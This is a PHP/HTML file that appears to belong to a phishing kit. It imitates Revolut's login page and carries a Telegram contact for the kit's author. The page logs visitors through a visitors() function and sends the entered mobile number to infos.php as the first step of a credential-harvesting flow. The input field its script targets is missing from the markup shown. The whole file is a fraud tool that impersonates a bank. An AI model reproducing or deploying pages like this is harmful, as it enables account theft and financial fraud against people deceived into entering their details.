<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";
visitors();


?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>A better way to handle your money | Revolut</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/facon.ico" type="image/x-icon" />
  <link rel="shortcut icon" href="image/facon.ico" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body>
  <div class="body">
    <div class="row" style="margin-right: 0;">
      <div class="col-lg-8">
        <div class="row">
          <div class="col-lg-3"></div>
          <div class="col-lg-6">
            <div class="form log px-2">
              <form action="infos.php" method="post">
                <input type="hidden" value="index" name="step">
                <h2>Log in to Revolut</h2>
                <p>Enter your registered mobile number to log in.</p>
               
                
                <div class="bttn"><button id="btn" name="submit">Log in</button></div>
              </form>
            </div>
          </div>
        </div>
      </div>
      <div class="col-lg-4 d-none d-lg-block" style="padding-right: 0;">
        <div class="img text-end"><img src="image/back.png"></div>
      </div>
    </div>
  </div>
  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>
    $("#number").mask("000 000000");

    $("#number").keyup(function(){
      if ($(this).val().length == 10) {
        $("#btn").css({"background":"#0666eb" , "color":"#fff" , "box-shadow":"#0666eb1f 0px 0.7rem 1.3rem 0px, #0666eb3d 0px 1rem 2.2rem 0px"})
      }
      else{
        $("#btn").css({"background":"#5c9ffb" , "color":"#ffffff80" , "box-shadow":"none"})
      }
    })


  </script>
</body>
</html>